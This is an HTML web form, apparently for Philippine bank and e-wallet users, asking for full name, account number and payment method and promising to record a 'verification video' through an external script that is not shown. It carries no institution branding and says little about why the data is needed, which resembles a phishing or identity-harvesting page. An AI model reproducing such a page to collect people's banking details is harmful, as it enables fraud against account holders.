<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Submit Banking Details</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { font-family: Arial, sans-serif; max-width: 820px; margin: 24px auto; padding: 10px; }
    label { display:block; margin:8px 0 4px; font-weight: 600; }
    input, select { width:100%; padding:8px; }
    button { padding:10px 16px; margin-top:14px; font-size: 16px; cursor: pointer; }
    #status { margin-top:12px; font-weight:600; }
    video { width:100%; max-width:360px; border:1px solid #ccc; border-radius:8px; margin-top:12px; }
  </style>
</head>
<body>
  <h1>Submit Banking Details</h1>

  <p>
    Please provide your banking information below. After clicking 
    <strong>Submit & Record</strong>, your details will be submitted before transaction.
  </p>

  <form id="kycForm">

    <label for="fullName">Full Name</label>
    <input id="fullName" name="fullName" placeholder="Juan Dela Cruz" required>

    <label for="accountNumber">Account Number</label>
    <input id="accountNumber" name="accountNumber" placeholder="1234-5678-90" required>

    <label for="transactionMethod">Transaction Method</label>
    <select id="transactionMethod" name="transactionMethod" required>
      <option value="">-- Select Transaction Method --</option>
      <option value="GCash">GCash</option>
      <option value="PayMaya">PayMaya</option>
      <option value="BPI">BPI</option>
      <option value="BDO">BDO</option>
      <option value="Metrobank">Metrobank</option>
      <option value="Landbank">Landbank</option>
      <option value="UnionBank">UnionBank</option>
      <option value="Chinabank">Chinabank</option>
      <option value="Other">Other</option>
    </select>

    <label style="margin-top: 12px;">
      <input type="checkbox" id="consent" required>
      I consent to uploading my banking details and a short verification video.
    </label>

    <button type="submit" id="submitBtn">Submit & Record</button>
  </form>

  <div id="status">Waiting for submissionâ€¦</div>
  <video id="preview" autoplay muted playsinline></video>

  <script src="/form-recorder.js" defer></script>
</body>
</html>
